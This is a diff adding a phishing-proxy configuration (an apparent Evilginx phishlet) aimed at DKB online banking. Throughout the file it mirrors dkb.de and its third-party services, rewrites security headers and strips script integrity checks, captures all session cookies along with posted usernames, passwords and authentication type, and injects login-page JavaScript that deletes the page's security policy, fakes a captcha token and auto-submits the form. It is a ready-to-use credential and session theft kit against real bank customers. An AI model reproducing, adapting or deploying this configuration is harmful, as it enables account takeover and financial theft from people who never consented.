@@ -1,0 +1,145 @@
+author: '@EvilWhales'
+min_ver: '3.3.0'
+
+proxy_hosts:
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'dkb.de', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'images.eu', orig_sub: 'images.eu', domain: 'ctfassets.net', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'experience', orig_sub: 'experience', domain: 'ninetailed.co', session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: 'banking', orig_sub: 'banking', domain: 'dkb.de', session: false, is_landing: true, auto_filter: false}
+  - {phish_sub: 'o504235.ingest', orig_sub: 'o504235.ingest', domain: 'sentry.io', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'web.cmp', orig_sub: 'web.cmp', domain: 'usercentrics.eu', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'responder', orig_sub: 'responder', domain: 'wt-safetag.com', session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: 'v1.api.service.cmp', orig_sub: 'v1.api.service.cmp', domain: 'usercentrics.eu', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'app', orig_sub: 'app', domain: 'usercentrics.eu', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'uct.service', orig_sub: 'uct.service', domain: 'usercentrics.eu', session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: 'graphql', orig_sub: 'graphql', domain: 'usercentrics.eu', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'bat', orig_sub: 'bat', domain: 'bing.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'dkb01', orig_sub: 'dkb01', domain: 'webtrekk.net', session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: 'snap', orig_sub: 'snap', domain: 'licdn.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'click.prod', orig_sub: 'click.prod', domain: 'mplat-ppcprotect.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'googlet', orig_sub: 'www', domain: 'googletagmanager.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'googleads.g', orig_sub: 'googleads.g', domain: 'doubleclick.net', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'google', orig_sub: 'www', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'execution-ci360.infos', orig_sub: 'execution-ci360.infos', domain: 'dkb.de', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'eu', orig_sub: 'eu', domain: 'frcapi.com', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'gstatic', orig_sub: 'www', domain: 'gstatic.com', session: true, is_landing: false, auto_filter: true}
+
+sub_filters:
+  - {triggers_on: 'www.dkb.de', orig_sub: 'www', domain: 'dkb.de', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript','image/png']}
+  - {triggers_on: 'www.dkb.de', orig_sub: 'banking', domain: 'dkb.de', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript','image/png']}
+  - {triggers_on: 'www.dkb.de', orig_sub: 'images.eu', domain: 'ctfassets.net', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript','image/png']}
+  - {triggers_on: 'www.dkb.de', orig_sub: 'experience', domain: 'ninetailed.co', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript','image/png']}
+  - {triggers_on: 'www.dkb.de', orig_sub: 'o504235.ingest', domain: 'sentry.io', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript','image/png']}
+  - {triggers_on: 'www.dkb.de', orig_sub: 'web.cmp', domain: 'usercentrics.eu', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript','image/png']}
+  - {triggers_on: 'www.dkb.de', orig_sub: 'responder', domain: 'wt-safetag.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript','image/png']}
+  - {triggers_on: 'www.dkb.de', orig_sub: 'v1.api.service.cmp', domain: 'usercentrics.eu', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript','image/png']}
+  - {triggers_on: 'www.dkb.de', orig_sub: 'app', domain: 'dkb.de', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript','image/png']}
+  - {triggers_on: 'www.dkb.de', orig_sub: 'uct.service', domain: 'usercentrics.eu', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript','image/png']}
+  - {triggers_on: 'www.dkb.de', orig_sub: 'graphql', domain: 'usercentrics.eu', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript','image/png']}
+  - {triggers_on: 'www.dkb.de', orig_sub: 'bat', domain: 'bing.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript','image/png']}
+  - {triggers_on: 'www.dkb.de', orig_sub: 'dkb01', domain: 'webtrekk.net', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript','image/png']}
+  - {triggers_on: 'www.dkb.de', orig_sub: 'snap', domain: 'licdn.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript','image/png']}
+  - {triggers_on: 'www.dkb.de', orig_sub: 'click.prod', domain: 'mplat-ppcprotect.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript','image/png']}
+  - {triggers_on: 'www.dkb.de', orig_sub: 'www', domain: 'dkb.de', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript','image/png']}
+  - {triggers_on: 'www.dkb.de', orig_sub: 'www', domain: 'googletagmanager.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript','image/png']}
+  - {triggers_on: 'www.dkb.de', orig_sub: 'googleads.g', domain: 'doubleclick.net', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript','image/png']}
+  - {triggers_on: 'banking.dkb.de', orig_sub: 'banking', domain: 'banking.dkb.de', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript','image/png']}
+  - {triggers_on: 'www.google.com', orig_sub: 'www', domain: 'google.com', search: "integrity[ \t]*=[ \t]*[\"']sha384-.{64}[\"']", replace: 'integrity=""', mimes: ['text/javascript']}
+  - {triggers_on: 'www.gstatic.com', orig_sub: 'accounts', domain: 'safe-domain.com', search: "\\(window.location.href\\)", replace: '(window.location.href.replace("{hostname}", "{orig_hostname}"))', mimes: ['text/javascript']}
+  - {triggers_on: 'eu.frcapi.com', orig_sub: 'eu', domain: 'frcapi.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript','image/png']}
+  - {triggers_on: 'www.dkb.de', orig_sub: 'eu', domain: 'frcapi.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript','image/png']}
+  - {triggers_on: 'www.dkb.de', orig_sub: 'execution-ci360.infos', domain: 'dkb.de', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript','image/png']}
+  - {triggers_on: 'www.dkb.de', orig_sub: 'banking', domain: 'dkb.de', search: 'frame-src\\s+(.*?)\\s*(;|$)', replace: 'frame-src \\1 *.dkb.fake.com https://*.frcapi.com/ \\2', mimes: ['text/html'], regex: true}
+  - {triggers_on: 'banking.dkb.de', orig_sub: 'banking', domain: 'dkb.de', search: 'frame-src\\s+(.*?)\\s*(;|$)', replace: 'frame-src \\1 *.dkb.fake.com https://*.frcapi.com/ \\2', mimes: ['text/html'], regex: true}
+  - {triggers_on: 'www.dkb.de', orig_sub: 'banking', domain: 'dkb.de', search: 'script-src-elem\\s+(.*?)\\s*(;|$)', replace: 'script-src-elem \\1 responder.wt-safetag.com \\2', mimes: ['text/html'], regex: true}
+  - {triggers_on: 'banking.dkb.de', orig_sub: 'banking', domain: 'dkb.de', search: 'script-src-elem\\s+(.*?)\\s*(;|$)', replace: 'script-src-elem \\1 responder.wt-safetag.com \\2', mimes: ['text/html'], regex: true}
+  - {triggers_on: 'www.dkb.de', orig_sub: 'banking', domain: 'dkb.de', search: 'Content-Security-Policy:\\s*frame-src\\s+(.*?)\\s*(;|$)', replace: 'Content-Security-Policy: frame-src \\1 *.dkb.fake.com https://*.frcapi.com/ \\2', mimes: ['text/plain'], regex: true}
+  - {triggers_on: 'banking.dkb.de', orig_sub: 'banking', domain: 'dkb.de', search: 'Content-Security-Policy:\\s*frame-src\\s+(.*?)\\s*(;|$)', replace: 'Content-Security-Policy: frame-src \\1 *.dkb.fake.com https://*.frcapi.com/ \\2', mimes: ['text/plain'], regex: true}
+
+auth_tokens:
+  - domain: 'www.dkb.de'
+    keys: ['.*,regexp']
+  - domain: 'banking.dkb.de'
+    keys: ['.*,regexp']
+  - domain: '.dkb.de'
+    keys: ['.*,regexp']
+
+credentials:
+  username:
+    key: 'username'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+  custom:
+    key: 'sca_type'
+    search: '(.*)'
+    type: 'post'
+
+login:
+  domain: 'banking.dkb.de'
+  path: '/login'
+
+js_inject:
+  - trigger_domains: ["www.dkb.de", "banking.dkb.de"]
+    trigger_paths: ["/login"]
+    trigger_params: []
+    script: |
+      (function() {
+        console.log("CSP disable + Mock for DKB Friendly Captcha");
+        
+        var metaCSP = document.querySelector('meta[http-equiv="Content-Security-Policy"], meta[http-equiv="content-security-policy"]');
+        if (metaCSP) {
+          metaCSP.remove();
+          console.log("Meta CSP removed");
+        }
+        
+        var mockToken = 'fc-mock.ZXLa8Z.AgAD1AA...';
+        
+        var observer = new MutationObserver(function(mutations) {
+          mutations.forEach(function(mutation) {
+            if (mutation.addedNodes.length > 0) {
+              var fcWidget = document.querySelector('.frc-captcha, [data-fc-public-key], iframe[src*="frcapi"]');
+              if (fcWidget) {
+                observer.disconnect();
+                console.log("Widget detected, attempting PoW...");
+                
+                var tokenInterval = setInterval(function() {
+                  var solutionInput = document.querySelector('input[name="frc-captcha-solution"], input[data-fc-solution]');
+                  if (solutionInput && solutionInput.value) {
+                    clearInterval(tokenInterval);
+                    console.log("Real PoW token: " + solutionInput.value.substring(0, 20) + "...");
+                    submitForm();
+                    return;
+                  }
+                  
+                  if (Date.now() - startTime > 30000) {
+                    clearInterval(tokenInterval);
+                    solutionInput.value = mockToken;
+                    solutionInput.dispatchEvent(new Event('input', { bubbles: true }));
+                    solutionInput.dispatchEvent(new Event('change', { bubbles: true }));
+                    console.log("Mock injected after timeout");
+                    submitForm();
+                  }
+                }, 1000);
+                
+                var startTime = Date.now();
+              }
+            }
+          });
+        });
+        observer.observe(document.body, { childList: true, subtree: true });
+        
+        function submitForm() {
+          var form = document.querySelector('form[action*="/login"]');
+          if (form) {
+            form.submit();
+            console.log("Form submitted");
+          }
+        }
+        
+        // Fallback check every 5s
+        setInterval(submitForm, 5000);
+      })();
